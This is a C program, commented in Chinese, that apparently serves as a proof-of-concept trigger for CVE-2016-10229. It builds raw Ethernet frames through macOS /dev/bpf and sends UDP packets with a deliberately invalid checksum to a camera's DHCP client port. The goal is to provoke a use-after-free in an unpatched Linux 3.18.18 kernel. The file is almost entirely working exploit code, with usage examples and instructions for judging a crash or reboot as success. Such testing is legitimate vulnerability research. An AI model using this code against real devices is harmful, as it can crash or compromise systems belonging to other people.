/*
 * bad_udp.c — 发送"UDP 校验和故意错误"的 UDP 包（CVE-2016-10229 触发器，macOS BPF 版）。
 *
 * 原理（见 08_Linux攻击面_P1候选漏洞_20261015.md 候选 #3）：
 *   内核 3.18.18 的 udp_recvmsg 在 recv(MSG_PEEK) 且校验和失败时，
 *   skb_kill_datagram 无条件 kfree_skb（未打补丁）→ goto try_again →
 *   对已释放 skb 二次校验和 = UAF。
 *   触发需要目标上某进程对该 UDP socket 做 recv(MSG_PEEK)。
 *   2026-10-16 新证据：rootfs dhcpcd（client）read_packet 用
 *   recvmsg(fd, msg, flags|MSG_PEEK|MSG_WAITALL) —— station 模式 listen socket(:68) 命中。
 *
 * 为什么走 /dev/bpf：macOS 禁止 raw socket 设 IP_HDRINCL，pcap_open_dead(DLT_RAW)
 *   也不能 send。macOS 标准做法 = 构造完整以太网帧写 /dev/bpfN（root）。
 *
 * 用法（root）：
 *   sudo ./bad_udp <dst_ip> <dst_port> <dst_mac> [count] [src_ip] [src_port] [ifname]
 *   例：sudo ./bad_udp 192.168.1.131 68 72:74:14:XX:XX:XX 10 192.168.1.148 54321 en9
 *   （dst_mac = 相机 MAC：arp -a | grep <相机IP>；ifname = 到相机的网卡，route -n get 查）
 *
 * 结果判读（观察相机）：
 *   崩溃/重启 = UAF 触发（该进程确用 MSG_PEEK，P1 结论需修正）
 *   无反应    = 前置不成立（该进程不用 MSG_PEEK，内核静默丢弃坏包）
 *
 * 风险：坏校验和 UDP 对未中招目标 = 内核静默丢弃，无破坏性。
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <net/if_dl.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <ifaddrs.h>

/* DIOCGETIFNAME 未在头文件声明（macOS），手动定义 */
#define DIOCGETIFNAME 0x4020424B

static uint16_t cksum(const void *data, size_t len)
{
    const uint16_t *p = data;
    uint32_t s = 0;
    while (len > 1) { s += *p++; len -= 2; }
    if (len) s += *(const uint8_t *)p;
    while (s >> 16) s = (s & 0xffff) + (s >> 16);
    return ~s;
}

static int parse_mac(const char *s, uint8_t m[6])
{
    unsigned v[6];
    if (sscanf(s, "%x:%x:%x:%x:%x:%x", &v[0], &v[1], &v[2], &v[3], &v[4], &v[5]) != 6)
        return -1;
    for (int i = 0; i < 6; i++) m[i] = v[i];
    return 0;
}

int main(int argc, char **argv)
{
    if (argc < 4) {
        fprintf(stderr,
            "usage: sudo %s <dst_ip> <dst_port> <dst_mac> [count] [src_ip] [src_port] [ifname]\n",
            argv[0]);
        return 1;
    }
    const char *dst_ip = argv[1];
    int dst_port = atoi(argv[2]);
    const char *dst_mac_s = argv[3];
    int count = argc > 4 ? atoi(argv[4]) : 10;
    const char *src_ip = argc > 5 ? argv[5] : "0.0.0.0";
    int src_port = argc > 6 ? atoi(argv[6]) : 54321;
    const char *ifname = argc > 7 ? argv[7] : "en0";

    uint8_t dst_mac[6];
    if (parse_mac(dst_mac_s, dst_mac)) {
        fprintf(stderr, "bad mac: %s\n", dst_mac_s);
        return 1;
    }

    /* 找该网卡的 MAC + bpf 设备 */
    uint8_t src_mac[6] = {0};
    struct ifaddrs *ifa, *if0;
    if (getifaddrs(&if0) != 0) { perror("getifaddrs"); return 1; }
    for (ifa = if0; ifa; ifa = ifa->ifa_next) {
        if (ifa->ifa_name && !strcmp(ifa->ifa_name, ifname) &&
            ifa->ifa_addr && ifa->ifa_addr->sa_family == AF_LINK) {
            struct sockaddr_dl *sdl = (struct sockaddr_dl *)ifa->ifa_addr;
            memcpy(src_mac, LLADDR(sdl), 6);
            break;
        }
    }
    freeifaddrs(if0);
    if (!src_mac[0]) {
        fprintf(stderr, "no MAC found for %s\n", ifname);
        return 1;
    }

    int bpf_fd = -1;
    char path[64];
    for (int i = 0; i < 16 && bpf_fd < 0; i++) {
        snprintf(path, sizeof(path), "/dev/bpf%d", i);
        int fd = open(path, O_RDWR);
        if (fd < 0) continue;
        char name[64] = {0};
        if (ioctl(fd, DIOCGETIFNAME, name) == 0 && !strcmp(name, ifname))
            bpf_fd = fd;
        else
            close(fd);
    }
    if (bpf_fd < 0) {
        fprintf(stderr, "no /dev/bpf for %s（需要 sudo）\n", ifname);
        return 1;
    }

    int plen = 512;
    size_t frame_len = 14 + 20 + 8 + plen;
    unsigned char *f = calloc(1, frame_len);

    uint32_t sip = inet_addr(src_ip), dip = inet_addr(dst_ip);

    for (int i = 0; i < count; i++) {
        memset(f, 0, frame_len);
        /* Ethernet */
        memcpy(f, dst_mac, 6);
        memcpy(f + 6, src_mac, 6);
        f[12] = 0x08; f[13] = 0x00;
        /* IP */
        unsigned char *ip = f + 14;
        uint16_t ip_total = 20 + 8 + plen;
        ip[0] = 0x45;
        ip[2] = (ip_total >> 8) & 0xff; ip[3] = ip_total & 0xff;
        ip[4] = i & 0xff; ip[5] = (i >> 8) & 0xff;
        ip[8] = 64; ip[9] = 17;
        memcpy(ip + 12, &sip, 4);
        memcpy(ip + 16, &dip, 4);
        uint16_t c = cksum(ip, 20);
        ip[10] = (c >> 8) & 0xff; ip[11] = c & 0xff;
        /* UDP：校验和故意 0xFFFF */
        unsigned char *u = f + 34;
        uint16_t sp = htons(src_port), dp = htons(dst_port);
        memcpy(u, &sp, 2); memcpy(u + 2, &dp, 2);
        uint16_t ulen = htons(8 + plen);
        memcpy(u + 4, &ulen, 2);
        memcpy(u + 6, "\xff\xff", 2);
        for (int j = 0; j < plen; j++) f[42 + j] = (unsigned char)('A' + (j & 0x1f));

        ssize_t w = write(bpf_fd, f, frame_len);
        if (w != (ssize_t)frame_len) {
            fprintf(stderr, "send #%d failed: %s\n", i, strerror(errno));
            break;
        }
        printf("[#%d] 坏校验和 UDP -> %s:%d  via %s/%s (plen=%d)\n",
               i, dst_ip, dst_port, ifname, dst_mac_s, plen);
        fflush(stdout);
        if (i + 1 < count) sleep(2);
    }
    free(f);
    close(bpf_fd);
    printf("完成。观察相机：崩溃/重启 = UAF 触发；无反应 = MSG_PEEK 前置不成立。\n");
    return 0;
}
